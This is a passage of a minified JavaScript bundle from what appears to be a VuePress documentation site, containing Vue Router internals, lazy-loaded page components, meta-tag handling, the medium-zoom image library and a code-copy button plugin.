wi(this.afterHooks,n)},xi.prototype.onReady=function(n,e){this.history.onReady(n,e)},xi.prototype.onError=function(n){this.history.onError(n)},xi.prototype.push=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.push(n,e,t)}));this.history.push(n,e,t)},xi.prototype.replace=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.replace(n,e,t)}));this.history.replace(n,e,t)},xi.prototype.go=function(n){this.history.go(n)},xi.prototype.back=function(){this.go(-1)},xi.prototype.forward=function(){this.go(1)},xi.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},xi.prototype.resolve=function(n,e,t){var r=xo(n,e=e||this.history.current,t,this),a=this.match(r,e),o=a.redirectedFrom||a.fullPath;return{location:r,route:a,href:function(n,e,t){var r="hash"===t?"#"+e:e;return n?no(n+"/"+r):r}(this.history.base,o,this.mode),normalizedTo:r,resolved:a}},xi.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==Ha&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(xi.prototype,Ei),xi.install=function n(e){if(!n.installed||Eo!==e){n.installed=!0,Eo=e;var t=function(n){return void 0!==n},r=function(n,e){var r=n.$options._parentVnode;t(r)&&t(r=r.data)&&t(r=r.registerRouteInstance)&&r(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",Ya),e.component("RouterLink",jo);var a=e.config.optionMergeStrategies;a.beforeRouteEnter=a.beforeRouteLeave=a.beforeRouteUpdate=a.created}},xi.version="3.4.9",xi.isNavigationFailure=ti,xi.NavigationFailureType=Ko,ko&&window.Vue&&window.Vue.use(xi);var ji=xi;t(50),t(210),t(212),t(143),t(144),t(73),t(214),t(51);function Ai(n){n.locales&&Object.keys(n.locales).forEach((function(e){n.locales[e].path=e})),Object.freeze(n)}t(191),t(147),t(30),t(193),t(72),t(42),t(62),t(89);function ki(n){return(ki="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n})(n)}var Bi=t(44),Si={NotFound:function(){return t.e(7).then(t.bind(null,391))},Layout:function(){return Promise.all([t.e(0),t.e(2)]).then(t.bind(null,390))}},Ti={"v-45c98a7a":function(){return t.e(9).then(t.bind(null,395))},"v-eff1ac7a":function(){return t.e(10).then(t.bind(null,396))},"v-16dd6f9c":function(){return t.e(8).then(t.bind(null,397))},"v-001ebd09":function(){return t.e(11).then(t.bind(null,398))},"v-4724a521":function(){return t.e(12).then(t.bind(null,399))},"v-991587be":function(){return t.e(15).then(t.bind(null,400))},"v-12c5f263":function(){return t.e(14).then(t.bind(null,401))},"v-a5269cf6":function(){return t.e(16).then(t.bind(null,402))},"v-8a0714ca":function(){return t.e(17).then(t.bind(null,403))},"v-780664cb":function(){return t.e(19).then(t.bind(null,404))},"v-6ef494da":function(){return t.e(20).then(t.bind(null,405))},"v-436e11b6":function(){return t.e(18).then(t.bind(null,406))},"v-70c85bc1":function(){return t.e(13).then(t.bind(null,407))},"v-1fd2367a":function(){return t.e(25).then(t.bind(null,408))},"v-74049526":function(){return t.e(22).then(t.bind(null,409))},"v-520e8ad4":function(){return t.e(23).then(t.bind(null,410))},"v-160d8211":function(){return t.e(27).then(t.bind(null,411))},"v-6b592820":function(){return t.e(24).then(t.bind(null,412))},"v-2e7f896a":function(){return t.e(29).then(t.bind(null,413))},"v-5461105e":function(){return t.e(28).then(t.bind(null,414))},"v-02135610":function(){return t.e(21).then(t.bind(null,415))},"v-71c5bcdd":function(){return t.e(32).then(t.bind(null,416))},"v-c7dd9e30":function(){return t.e(30).then(t.bind(null,417))},"v-60d537e2":function(){return t.e(33).then(t.bind(null,418))},"v-45c9245d":function(){return t.e(31).then(t.bind(null,419))},"v-4eca17c5":function(){return t.e(35).then(t.bind(null,420))},"v-3b75c570":function(){return t.e(37).then(t.bind(null,421))},"v-84ffdf68":function(){return t.e(34).then(t.bind(null,422))},"v-07bf1260":function(){return t.e(36).then(t.bind(null,423))},"v-60fb8218":function(){return t.e(26).then(t.bind(null,424))},"v-5a8ffa96":function(){return t.e(40).then(t.bind(null,425))},"v-d0738c54":function(){return t.e(41).then(t.bind(null,426))},"v-b6d0b054":function(){return t.e(39).then(t.bind(null,427))},"v-3efb0494":function(){return t.e(45).then(t.bind(null,428))},"v-665613b6":function(){return t.e(43).then(t.bind(null,429))},"v-3b8aff57":function(){return t.e(46).then(t.bind(null,430))},"v-741db942":function(){return t.e(42).then(t.bind(null,431))},"v-71010e0c":function(){return t.e(38).then(t.bind(null,432))},"v-309f3f3a":function(){return t.e(47).then(t.bind(null,433))},"v-45a193dc":function(){return t.e(44).then(t.bind(null,434))},"v-084ad13e":function(){return t.e(50).then(t.bind(null,435))},"v-34775b24":function(){return t.e(51).then(t.bind(null,436))},"v-42b03843":function(){return t.e(48).then(t.bind(null,437))},"v-01b4c3e0":function(){return t.e(53).then(t.bind(null,438))},"v-15338e13":function(){return t.e(49).then(t.bind(null,439))},"v-028107c2":function(){return t.e(54).then(t.bind(null,440))},"v-3b3c3f18":function(){return t.e(55).then(t.bind(null,441))},"v-f7191182":function(){return t.e(52).then(t.bind(null,442))},"v-21d491c4":function(){return t.e(59).then(t.bind(null,443))},"v-240eb8d6":function(){return t.e(58).then(t.bind(null,444))},"v-2876cb51":function(){return t.e(60).then(t.bind(null,445))},"v-88c9b268":function(){return t.e(63).then(t.bind(null,446))},"v-1552e756":function(){return t.e(61).then(t.bind(null,447))},"v-df1d0324":function(){return t.e(62).then(t.bind(null,448))},"v-d3a1b5fe":function(){return t.e(64).then(t.bind(null,449))},"v-50bee77e":function(){return t.e(57).then(t.bind(null,450))},"v-340241d1":function(){return t.e(56).then(t.bind(null,451))},"v-5402d2f3":function(){return t.e(69).then(t.bind(null,452))},"v-031f061b":function(){return t.e(68).then(t.bind(null,453))},"v-cae50b74":function(){return t.e(71).then(t.bind(null,454))},"v-2f0a7a0c":function(){return t.e(70).then(t.bind(null,455))},"v-cdcd6a46":function(){return t.e(65).then(t.bind(null,456))},"v-6990fdee":function(){return t.e(72).then(t.bind(null,457))},"v-5435f4b4":function(){return t.e(73).then(t.bind(null,458))},"v-5b2f0866":function(){return t.e(75).then(t.bind(null,459))},"v-75521d69":function(){return t.e(76).then(t.bind(null,460))},"v-278ee170":function(){return t.e(66).then(t.bind(null,461))},"v-3a0230b7":function(){return t.e(79).then(t.bind(null,462))},"v-01ad37c1":function(){return t.e(78).then(t.bind(null,463))},"v-b704c824":function(){return t.e(81).then(t.bind(null,464))},"v-08f38c1c":function(){return t.e(82).then(t.bind(null,465))},"v-0b2a1213":function(){return t.e(80).then(t.bind(null,466))},"v-34d3e5dc":function(){return t.e(77).then(t.bind(null,467))},"v-4569d274":function(){return t.e(74).then(t.bind(null,468))},"v-4d756216":function(){return t.e(83).then(t.bind(null,469))},"v-37d7ea1c":function(){return t.e(84).then(t.bind(null,470))},"v-cc9d725c":function(){return t.e(85).then(t.bind(null,471))},"v-321db935":function(){return t.e(88).then(t.bind(null,472))},"v-5c7a4195":function(){return t.e(87).then(t.bind(null,473))},"v-4d169389":function(){return t.e(86).then(t.bind(null,474))},"v-378a2ae2":function(){return t.e(89).then(t.bind(null,475))},"v-59ec66ce":function(){return t.e(92).then(t.bind(null,476))},"v-a26dfcc8":function(){return t.e(90).then(t.bind(null,477))},"v-b2cc8c62":function(){return t.e(91).then(t.bind(null,478))},"v-545eeac7":function(){return t.e(93).then(t.bind(null,479))},"v-dcd37ecc":function(){return t.e(95).then(t.bind(null,480))},"v-b7eec8c0":function(){return t.e(96).then(t.bind(null,481))},"v-186b330c":function(){return t.e(67).then(t.bind(null,482))},"v-05ecbe92":function(){return t.e(98).then(t.bind(null,483))},"v-c4aef394":function(){return t.e(101).then(t.bind(null,484))},"v-4df5d9c0":function(){return t.e(97).then(t.bind(null,485))},"v-56e88d5a":function(){return t.e(102).then(t.bind(null,486))},"v-62e6c142":function(){return t.e(104).then(t.bind(null,487))},"v-7daac0ba":function(){return t.e(100).then(t.bind(null,488))},"v-8d632b36":function(){return t.e(99).then(t.bind(null,489))},"v-e085a9a0":function(){return t.e(103).then(t.bind(null,490))},"v-8b3db7f8":function(){return t.e(108).then(t.bind(null,491))},"v-fabee476":function(){return t.e(105).then(t.bind(null,492))},"v-1c068d40":function(){return t.e(110).then(t.bind(null,493))},"v-d168f400":function(){return t.e(107).then(t.bind(null,494))},"v-45c6de1a":function(){return t.e(112).then(t.bind(null,495))},"v-48455a8b":function(){return t.e(111).then(t.bind(null,496))},"v-4460ac7c":function(){return t.e(109).then(t.bind(null,497))},"v-64862be0":function(){return t.e(114).then(t.bind(null,498))},"v-15996d3c":function(){return t.e(113).then(t.bind(null,499))},"v-74ca3e4b":function(){return t.e(115).then(t.bind(null,500))},"v-6a5a6af9":function(){return t.e(117).then(t.bind(null,501))},"v-345a822e":function(){return t.e(119).then(t.bind(null,502))},"v-3f1af7ad":function(){return t.e(121).then(t.bind(null,503))},"v-59b39c69":function(){return t.e(94).then(t.bind(null,504))},"v-9982385c":function(){return t.e(123).then(t.bind(null,505))},"v-5fcd590d":function(){return t.e(118).then(t.bind(null,506))},"v-42bcf22a":function(){return t.e(106).then(t.bind(null,507))},"v-17cfa6e4":function(){return t.e(122).then(t.bind(null,508))},"v-1119d962":function(){return t.e(124).then(t.bind(null,509))},"v-1e3d26ec":function(){return t.e(126).then(t.bind(null,510))},"v-4332dd72":function(){return t.e(125).then(t.bind(null,511))},"v-0c11bfa5":function(){return t.e(129).then(t.bind(null,512))},"v-00ce3b46":function(){return t.e(130).then(t.bind(null,513))},"v-d679d410":function(){return t.e(133).then(t.bind(null,514))},"v-e553a3d0":function(){return t.e(131).then(t.bind(null,515))},"v-93415808":function(){return t.e(134).then(t.bind(null,516))},"v-630b9f2b":function(){return t.e(135).then(t.bind(null,517))},"v-0d83810e":function(){return t.e(138).then(t.bind(null,518))},"v-7e0cfcf8":function(){return t.e(137).then(t.bind(null,519))},"v-36f6dd32":function(){return t.e(136).then(t.bind(null,520))},"v-e2a5b0dc":function(){return t.e(139).then(t.bind(null,521))},"v-34b7b872":function(){return t.e(140).then(t.bind(null,522))},"v-be053fec":function(){return t.e(143).then(t.bind(null,523))},"v-4216b4c1":function(){return t.e(142).then(t.bind(null,524))},"v-2f8d0c06":function(){return t.e(144).then(t.bind(null,525))},"v-43166de5":function(){return t.e(146).then(t.bind(null,526))},"v-67e2281f":function(){return t.e(141).then(t.bind(null,527))},"v-18d67b3c":function(){return t.e(148).then(t.bind(null,528))},"v-ac3c3d16":function(){return t.e(116).then(t.bind(null,529))},"v-b2e4e7ba":function(){return t.e(145).then(t.bind(null,530))},"v-5ed3d4da":function(){return t.e(147).then(t.bind(null,531))},"v-2b5db4c6":function(){return t.e(150).then(t.bind(null,532))},"v-4c2b1aaa":function(){return t.e(128).then(t.bind(null,533))},"v-1f79180e":function(){return t.e(132).then(t.bind(null,534))},"v-206fc08c":function(){return t.e(120).then(t.bind(null,535))},"v-62f4f016":function(){return t.e(152).then(t.bind(null,536))},"v-73512eb8":function(){return t.e(154).then(t.bind(null,537))},"v-4e8396ae":function(){return t.e(156).then(t.bind(null,538))},"v-6a8af3a8":function(){return t.e(149).then(t.bind(null,539))},"v-7f0e1f7e":function(){return t.e(153).then(t.bind(null,540))},"v-51ff2b5c":function(){return t.e(157).then(t.bind(null,541))},"v-35e2424c":function(){return t.e(158).then(t.bind(null,542))},"v-0cf37c6e":function(){return t.e(127).then(t.bind(null,543))},"v-dbded3f4":function(){return t.e(155).then(t.bind(null,544))},"v-1bea5d48":function(){return t.e(151).then(t.bind(null,545))}};function Ii(n){var e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}var Ri=/-(\w)/g,zi=Ii((function(n){return n.replace(Ri,(function(n,e){return e?e.toUpperCase():""}))})),Ci=/\B([A-Z])/g,Di=Ii((function(n){return n.replace(Ci,"-$1").toLowerCase()})),Oi=Ii((function(n){return n.charAt(0).toUpperCase()+n.slice(1)}));function Ji(n,e){if(e)return n(e)?n(e):e.includes("-")?n(Oi(zi(e))):n(Oi(e))||n(Di(e))}var Mi=Object.assign({},Si,Ti),Pi=function(n){return Mi[n]},_i=function(n){return Ti[n]},Fi=function(n){return Si[n]},Ni=function(n){return Ca.component(n)};function Li(n){return Ji(_i,n)}function qi(n){return Ji(Fi,n)}function $i(n){return Ji(Pi,n)}function Wi(n){return Ji(Ni,n)}function Hi(){for(var n=arguments.length,e=new Array(n),t=0;t<n;t++)e[t]=arguments[t];return Promise.all(e.filter((function(n){return n})).map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(Wi(e)||!$i(e)){n.next=5;break}return n.next=3,$i(e)();case 3:t=n.sent,Ca.component(e,t.default);case 5:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()))}function Ui(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}t(108),t(186);var Vi=t(102),Gi=t(177),Xi=t.n(Gi),Ki={created:function(){if(this.siteMeta=this.$site.headTags.filter((function(n){return"meta"===Object(Vi.a)(n,1)[0]})).map((function(n){var e=Object(Vi.a)(n,2);e[0];return e[1]})),this.$ssrContext){var n=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(e=n)?e.map((function(n){var e="<meta";return Object.keys(n).forEach((function(t){e+=" ".concat(t,'="').concat(n[t],'"')})),e+">"})).join("\n    "):"",this.$ssrContext.canonicalLink=Qi(this.$canonicalUrl)}var e},mounted:function(){this.currentMetaTags=Object(Bi.a)(document.querySelectorAll("meta")),this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta:function(){document.title=this.$title,document.documentElement.lang=this.$lang;var n=this.getMergedMetaTags();this.currentMetaTags=Zi(n,this.currentMetaTags)},getMergedMetaTags:function(){var n=this.$page.frontmatter.meta||[];return Xi()([{name:"description",content:this.$description}],n,this.siteMeta,nl)},updateCanonicalLink:function(){Yi(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",Qi(this.$canonicalUrl))}},watch:{$page:function(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy:function(){Zi(null,this.currentMetaTags),Yi()}};function Yi(){var n=document.querySelector("link[rel='canonical']");n&&n.remove()}function Qi(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return n?'<link href="'.concat(n,'" rel="canonical" />'):""}function Zi(n,e){if(e&&Object(Bi.a)(e).filter((function(n){return n.parentNode===document.head})).forEach((function(n){return document.head.removeChild(n)})),n)return n.map((function(n){var e=document.createElement("meta");return Object.keys(n).forEach((function(t){e.setAttribute(t,n[t])})),document.head.appendChild(e),e}))}function nl(n){for(var e=0,t=["name","property","itemprop"];e<t.length;e++){var r=t[e];if(n.hasOwnProperty(r))return n[r]+r}return JSON.stringify(n)}t(90);var el=t(70),tl=t.n(el),rl={mounted:function(){var n=this;tl.a.configure({showSpinner:!1}),this.$router.beforeEach((function(n,e,t){n.path===e.path||Ca.component(n.name)||tl.a.start(),t()})),this.$router.afterEach((function(){tl.a.done(),n.isSidebarOpen=!1}))}},al=t(178),ol=t.n(al),il={mounted:function(){ol.a.polyfill()}},ll=(t(100),t(312),Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n}),sl=function(n){return"IMG"===n.tagName},cl=function(n){return n&&1===n.nodeType},dl=function(n){return".svg"===(n.currentSrc||n.src).substr(-4).toLowerCase()},ul=function(n){try{return Array.isArray(n)?n.filter(sl):function(n){return NodeList.prototype.isPrototypeOf(n)}(n)?[].slice.call(n).filter(sl):cl(n)?[n].filter(sl):"string"==typeof n?[].slice.call(document.querySelectorAll(n)).filter(sl):[]}catch(n){throw new TypeError("The provided selector is invalid.\nExpects a CSS selector, a Node element, a NodeList or an array.\nSee: https://github.com/francoischalifour/medium-zoom")}},pl=function(n){var e=document.createElement("div");return e.classList.add("medium-zoom-overlay"),e.style.background=n,e},ml=function(n){var e=n.getBoundingClientRect(),t=e.top,r=e.left,a=e.width,o=e.height,i=n.cloneNode(),l=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,s=window.pageXOffset||document.documentElement.scrollLeft||document.body.scrollLeft||0;return i.removeAttribute("id"),i.style.position="absolute",i.style.top=t+l+"px",i.style.left=r+s+"px",i.style.width=a+"px",i.style.height=o+"px",i.style.transform="",i},hl=function(n,e){var t=ll({bubbles:!1,cancelable:!1,detail:void 0},e);if("function"==typeof window.CustomEvent)return new CustomEvent(n,t);var r=document.createEvent("CustomEvent");return r.initCustomEvent(n,t.bubbles,t.cancelable,t.detail),r};!function(n,e){void 0===e&&(e={});var t=e.insertAt;if(n&&"undefined"!=typeof document){var r=document.head||document.getElementsByTagName("head")[0],a=document.createElement("style");a.type="text/css","top"===t&&r.firstChild?r.insertBefore(a,r.firstChild):r.appendChild(a),a.styleSheet?a.styleSheet.cssText=n:a.appendChild(document.createTextNode(n))}}(".medium-zoom-overlay{position:fixed;top:0;right:0;bottom:0;left:0;opacity:0;transition:opacity .3s;will-change:opacity}.medium-zoom--opened .medium-zoom-overlay{cursor:pointer;cursor:zoom-out;opacity:1}.medium-zoom-image{cursor:pointer;cursor:zoom-in;transition:transform .3s cubic-bezier(.2,0,.2,1)!important}.medium-zoom-image--hidden{visibility:hidden}.medium-zoom-image--opened{position:relative;cursor:pointer;cursor:zoom-out;will-change:transform}");var fl=function n(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},r=window.Promise||function(n){function e(){}n(e,e)},a=function(n){var e=n.target;e!==k?-1!==y.indexOf(e)&&f({target:e}):h()},o=function(){if(!E&&A.original){var n=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0;Math.abs(w-n)>j.scrollOffset&&setTimeout(h,150)}},i=function(n){var e=n.key||n.keyCode;"Escape"!==e&&"Esc"!==e&&27!==e||h()},l=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n;if(n.background&&(k.style.background=n.background),n.container&&n.container instanceof Object&&(e.container=ll({},j.container,n.container)),n.template){var t=cl(n.template)?n.template:document.querySelector(n.template);e.template=t}return j=ll({},j,e),y.forEach((function(n){n.dispatchEvent(hl("medium-zoom:update",{detail:{zoom:B}}))})),B},s=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return n(ll({},j,e))},c=function(){for(var n=arguments.length,e=Array(n),t=0;t<n;t++)e[t]=arguments[t];var r=e.reduce((function(n,e){return[].concat(n,ul(e))}),[]);return r.filter((function(n){return-1===y.indexOf(n)})).forEach((function(n){y.push(n),n.classList.add("medium-zoom-image")})),x.forEach((function(n){var e=n.type,t=n.listener,a=n.options;r.forEach((function(n){n.addEventListener(e,t,a)}))})),B},d=function(){for(var n=arguments.length,e=Array(n),t=0;t<n;t++)e[t]=arguments[t];A.zoomed&&h();var r=e.length>0?e.reduce((function(n,e){return[].concat(n,ul(e))}),[]):y;return r.forEach((function(n){n.classList.remove("medium-zoom-image"),n.dispatchEvent(hl("medium-zoom:detach",{detail:{zoom:B}}))})),y=y.filter((function(n){return-1===r.indexOf(n)})),B},u=function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return y.forEach((function(r){r.addEventListener("medium-zoom:"+n,e,t)})),x.push({type:"medium-zoom:"+n,listener:e,options:t}),B},p=function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return y.forEach((function(r){r.removeEventListener("medium-zoom:"+n,e,t)})),x=x.filter((function(t){return!(t.type==="medium-zoom:"+n&&t.listener.toString()===e.toString())})),B},m=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n.target,t=function(){var n={width:document.documentElement.clientWidth,height:document.documentElement.clientHeight,left:0,top:0,right:0,bottom:0},e=void 0,t=void 0;if(j.container)if(j.container instanceof Object)e=(n=ll({},n,j.container)).width-n.left-n.right-2*j.margin,t=n.height-n.top-n.bottom-2*j.margin;else{var r=(cl(j.container)?j.container:document.querySelector(j.container)).getBoundingClientRect(),a=r.width,o=r.height,i=r.left,l=r.top;n=ll({},n,{width:a,height:o,left:i,top:l})}e=e||n.width-2*j.margin,t=t||n.height-2*j.margin;var s=A.zoomedHd||A.original,c=dl(s)?e:s.naturalWidth||e,d=dl(s)?t:s.naturalHeight||t,u=s.getBoundingClientRect(),p=u.top,m=u.left,h=u.width,f=u.height,v=Math.min(c,e)/h,g=Math.min(d,t)/f,b=Math.min(v,g),y="scale("+b+") translate3d("+((e-h)/2-m+j.margin+n.left)/b+"px, "+((t-f)/2-p+j.margin+n.top)/b+"px, 0)";A.zoomed.style.transform=y,A.zoomedHd&&(A.zoomedHd.style.transform=y)};return new r((function(n){if(e&&-1===y.indexOf(e))n(B);else{if(A.zoomed)n(B);else{if(e)A.original=e;else{if(!(y.length>0))return void n(B);var r=y;A.original=r[0]}if(A.original.dispatchEvent(hl("medium-zoom:open",{detail:{zoom:B}})),w=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,E=!0,A.zoomed=ml(A.original),document.body.appendChild(k),j.template){var a=cl(j.template)?j.template:document.querySelector(j.template);A.template=document.createElement("div"),A.template.appendChild(a.content.cloneNode(!0)),document.body.appendChild(A.template)}if(document.body.appendChild(A.zoomed),window.requestAnimationFrame((function(){document.body.classList.add("medium-zoom--opened")})),A.original.classList.add("medium-zoom-image--hidden"),A.zoomed.classList.add("medium-zoom-image--opened"),A.zoomed.addEventListener("click",h),A.zoomed.addEventListener("transitionend",(function e(){E=!1,A.zoomed.removeEventListener("transitionend",e),A.original.dispatchEvent(hl("medium-zoom:opened",{detail:{zoom:B}})),n(B)})),A.original.getAttribute("data-zoom-src")){A.zoomedHd=A.zoomed.cloneNode(),A.zoomedHd.removeAttribute("srcset"),A.zoomedHd.removeAttribute("sizes"),A.zoomedHd.src=A.zoomed.getAttribute("data-zoom-src"),A.zoomedHd.onerror=function(){clearInterval(o),console.warn("Unable to reach the zoom image target "+A.zoomedHd.src),A.zoomedHd=null,t()};var o=setInterval((function(){A.zoomedHd.complete&&(clearInterval(o),A.zoomedHd.classList.add("medium-zoom-image--opened"),A.zoomedHd.addEventListener("click",h),document.body.appendChild(A.zoomedHd),t())}),10)}else if(A.original.hasAttribute("srcset")){A.zoomedHd=A.zoomed.cloneNode(),A.zoomedHd.removeAttribute("sizes");var i=A.zoomedHd.addEventListener("load",(function(){A.zoomedHd.removeEventListener("load",i),A.zoomedHd.classList.add("medium-zoom-image--opened"),A.zoomedHd.addEventListener("click",h),document.body.appendChild(A.zoomedHd),t()}))}else t()}}}))},h=function(){return new r((function(n){if(!E&&A.original){E=!0,document.body.classList.remove("medium-zoom--opened"),A.zoomed.style.transform="",A.zoomedHd&&(A.zoomedHd.style.transform=""),A.template&&(A.template.style.transition="opacity 150ms",A.template.style.opacity=0),A.original.dispatchEvent(hl("medium-zoom:close",{detail:{zoom:B}})),A.zoomed.addEventListener("transitionend",(function e(){A.original.classList.remove("medium-zoom-image--hidden"),document.body.removeChild(A.zoomed),A.zoomedHd&&document.body.removeChild(A.zoomedHd),document.body.removeChild(k),A.zoomed.classList.remove("medium-zoom-image--opened"),A.template&&document.body.removeChild(A.template),E=!1,A.zoomed.removeEventListener("transitionend",e),A.original.dispatchEvent(hl("medium-zoom:closed",{detail:{zoom:B}})),A.original=null,A.zoomed=null,A.zoomedHd=null,A.template=null,n(B)}))}else n(B)}))},f=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n.target;return A.original?h():m({target:e})},v=function(){return j},g=function(){return y},b=function(){return A.original},y=[],x=[],E=!1,w=0,j=t,A={original:null,zoomed:null,zoomedHd:null,template:null};"[object Object]"===Object.prototype.toString.call(e)?j=e:(e||"string"==typeof e)&&c(e),j=ll({margin:0,background:"#fff",scrollOffset:40,container:null,template:null},j);var k=pl(j.background);document.addEventListener("click",a),document.addEventListener("keyup",i),document.addEventListener("scroll",o),window.addEventListener("resize",h);var B={open:m,close:h,toggle:f,update:l,clone:s,attach:c,detach:d,on:u,off:p,getOptions:v,getImages:g,getZoomedImage:b};return B},vl={data:function(){return{zoom:null}},mounted:function(){this.updateZoom()},updated:function(){this.updateZoom()},methods:{updateZoom:function(){var n=this;setTimeout((function(){n.zoom&&n.zoom.detach(),n.zoom=fl("img",{})}),1e3)}}},gl=(t(179),t(69)),bl=t.n(gl),yl={mounted:function(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:bl()((function(){this.setActiveHash()}),300),setActiveHash:function(){for(var n=this,e=[].slice.call(document.querySelectorAll(".sidebar-link")),t=[].slice.call(document.querySelectorAll(".header-anchor")).filter((function(n){return e.some((function(e){return e.hash===n.hash}))})),r=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),o=window.innerHeight+r,i=0;i<t.length;i++){var l=t[i],s=t[i+1],c=0===i&&0===r||r>=l.parentElement.offsetTop+10&&(!s||r<s.parentElement.offsetTop-10),d=decodeURIComponent(this.$route.hash);if(c&&d!==decodeURIComponent(l.hash)){var u=l;if(o===a)for(var p=i+1;p<t.length;p++)if(d===decodeURIComponent(t[p].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(u.hash),(function(){n.$nextTick((function(){n.$vuepress.$set("disableScrollBehavior",!1)}))}))}}}},beforeDestroy:function(){window.removeEventListener("scroll",this.onScroll)}},xl=t(120),El=(t(196),{props:{parent:Object,code:String,options:{align:String,color:String,backgroundTransition:Boolean,backgroundColor:String,successText:String,staticIcon:Boolean}},data:function(){return{success:!1,originalBackground:null,originalTransition:null}},computed:{alignStyle:function(){var n={};return n[this.options.align]="7.5px",n},iconClass:function(){return this.options.staticIcon?"":"hover"}},mounted:function(){this.originalTransition=this.parent.style.transition,this.originalBackground=this.parent.style.background},beforeDestroy:function(){this.parent.style.transition=this.originalTransition,this.parent.style.background=this.originalBackground},methods:{hexToRgb:function(n){var e=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(n);return e?{r:parseInt(e[1],16),g:parseInt(e[2],16),b:parseInt(e[3],16)}:null},copyToClipboard:function(n){var e=this;if(navigator.clipboard)navigator.clipboard.writeText(this.code).then((function(){e.setSuccessTransitions()}),(function(){}));else{var t=document.createElement("textarea");document.body.appendChild(t),t.value=this.code,t.select(),document.execCommand("Copy"),t.remove(),this.setSuccessTransitions()}},setSuccessTransitions:function(){var n=this;if(clearTimeout(this.successTimeout),this.options.backgroundTransition){this.parent.style.transition="background 350ms";var e=this.hexToRgb(this.options.backgroundColor);this.parent.style.background="rgba(".concat(e.r,", ").concat(e.g,", ").concat(e.b,", 0.1)")}this.success=!0,this.successTimeout=setTimeout((function(){n.options.backgroundTransition&&(n.parent.style.background=n.originalBackground,n.parent.style.transition=n.originalTransition),n.success=!1}),500)}}}),wl=(t(316),t(17)),jl=Object(wl.a)(El,(function(){var n=this,e=n.$createElement,t=n._self._c||e;return t("div",{staticClass:"code-copy"},[t("svg",{class:n.iconClass,style:n.alignStyle,attrs:{xmlns:"http://www.w3.org/2000/svg",width:"24",height:"24",viewBox:"0 0 24 24"},on:{click:n.copyToClipboard}},[t("path",{attrs:{fill:"none",d:"M0 0h24v24H0z"}}),n._v(" "),t("path",{attrs:{fill:n.options.color,d:"M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm-1 4l6 6v10c0 1.1-.9 2-2 2H7.99C6.89 23 6 22.1 6 21l.01-14c0-1.1.89-2 1.99-2h7zm-1 7h5.5L14 6.5V12z"}})]),n._v(" "),t("span",{class:n.success?"success":"",style:n.alignStyle},[n._v("\n        "+n._s(n.options.successText)+"\n    ")])])}),[],!1,null,"49140617",null).exports,Al=(t(317),[Ki,rl,il,vl,yl,{updated:function(){this.update()},methods:{update:function(){setTimeout((function(){document.querySelectorAll('div[class*="language-"] pre').forEach((function(n){if(!n.classList.contains("code-copy-added")){var e=new(Ca.extend(jl));e.options=Object(xl.a)({},{align:"bottom",color:"#27b1ff",backgroundTransition:!0,backgroundColor:"#0075b8",successText:"Copied!",staticIcon:!1}),e.code=n.innerText,e.parent=n,e.$mount(),n.classList.add("code-copy-added"),n.appendChild(e.$el)}}))}),100)}}}]),kl={name:"GlobalLayout",computed:{layout:function(){var n=this.getLayout();return Ui("layout",n),Ca.component(n)}},methods:{getLayout:function(){if(this.$page.path){var n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},Bl=Object(wl.a)(kl,(function(){var n=this.$createElement;return(this._self._c||n)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){var 